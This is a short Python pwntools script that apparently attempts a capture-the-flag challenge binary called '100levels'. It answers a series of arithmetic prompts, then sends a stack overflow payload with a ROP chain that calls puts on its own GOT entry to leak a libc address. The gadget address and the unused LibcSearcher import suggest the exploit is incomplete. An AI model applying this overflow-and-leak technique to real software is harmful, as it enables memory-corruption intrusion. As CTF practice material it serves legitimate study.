from pwn import *
from LibcSearcher import *
p=process('./100levels')
elf=ELF('./100levels')
context.log_level=True
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_rid=0x0000000000001033
def cal(ifdown=1):
    p.recvuntil(b'Question: ')
    a=int(p.recvuntil(b' ').decode())
    p.recvuntil(b'* ')
    b=int(p.recvuntil(b' ').decode())
    print('a=',a,' b=',b)
    p.recv()
    
    if ifdown==0:
        pause()
        p.sendline((str(a*b).encode()).ljust(0x38,b'\x00')+p64(pop_rid)+p64(puts_got)+p64(puts_plt))
    else:
        p.sendline(str(a*b).encode())

p.recvuntil(b'Choice:\n')
p.sendline(b'1')
p.recvuntil(b'\n')
p.sendline(b'20')
p.recvuntil(b'\n')
p.sendline(b'0')

for i in range(19):
    cal()
cal(0)
print(p.recv())
p.interactive()

